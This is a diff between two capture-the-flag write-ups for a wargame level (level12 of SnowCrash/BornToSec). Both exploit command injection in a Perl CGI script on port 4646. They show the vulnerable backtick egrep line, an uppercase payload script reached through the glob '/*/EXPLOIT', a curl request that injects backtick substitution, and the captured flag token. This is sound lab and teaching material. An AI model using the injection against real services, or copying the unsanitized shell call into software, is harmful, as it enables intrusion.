@@ -1,69 +1,37 @@
-# cat README
+On login we see a perl script that is running a webserver on the port 4646, that can take two get params, x and y.
+We can clearly were we gonna do the exploit here, there is backquote.
+
 ```
-level12@BornToSec:~$ cat README
-$i=4;$|=@f=map{("!"x$i++)."K$_^\x{0e}"}"BQI!\\","BQI\\","BQI","BQ","B","";push@f,reverse@f[1..5];@f=map{join"",undef,map{chr(ord()-1)}split""}@f;{;$f=shift@f;print$f;push@f,$f;select undef,undef,undef,.25;redo;last;exit;print or die;}
-You can try to understand this little script and there is a chance to have this flag..
-/!\ If you try to run it make sure you understand all this code ..:) /!\
-Or just exploit this single small script on this folder.
-This script run on port 4646
+	@output = `egrep "^$xx" /tmp/xd 2>&1`;
 ```
 
-# let see the script level12.pl
+By looking on the code we can see 2 regex
+
 ```
-level12@BornToSec:~$ cat level12.pl
-#!/usr/bin/env perl
-
-use CGI qw{param};
-
-print "Content-type: text/html\n\n";
-
-sub ft_par {
-  $first = $_[0];
-  $second = $_[1];
-
-  $first =~ tr/a-z/A-Z/;
-  $first =~ s/\s.*//;
-
-  @output = `egrep "^$first" /home/flag/flag12/db.txt 2>&1`;
-
-  ...
-}
-...
-ft_start(ft_par(param("first"), param("second")));
+	$xx =~ tr/a-z/A-Z/;
+	$xx =~ s/\s.*//;
 ```
 
-# like others we can see injectable vuln with userinput
+the first one convert every alpha characters to their uppercase equivalence,
+the second one remove every space.
+So we can't exploit by simply call `getflag > /tmp/toto`,
+but we can use shell substitution * and create a uppercase file exploit, name /tmp/EXPLOIT, /*/EXPLOIT will match it.
+(don't forget to change permissions)
+
 ```
-@output = `egrep "^$first" /home/flag/flag12/db.txt 2>&1`;
+	#!/bin/sh
+	getflag | wall
 ```
 
-# but there are some strings transforme
-```
-  $first =~ tr/a-z/A-Z/;
-  $first =~ s/\s.*//;
-```
+and then simply use curl or do a ssh bridge to make a http call.
 
-# so we need to create a script in /tmp
-# and call it in the first parameters
-# so here the script go
-# the name have to be in maj to be find by egrep injection
-# because of transforme up here
 ```
-level12@BornToSec:~$ cat /tmp/PAYLOAD
-#!/bin/sh
-getflag > /tmp/tommy/flag
-```
+level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
 
-# then we just need to curl the ip with the payload
-```
-curl --data "first=\`/*/PAYLOAD\`" 127.0.0.1:4646
-```
+Broadcast Message from flag12@Snow
+        (somewhere) at 13:05 ...
 
-# here you go
-```
-level12@BornToSec:/tmp/tommy$ ls
-flag
-
-level12@BornToSec:/tmp/tommy$ cat flag
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+..level12@SnowCrash:~$
 ```
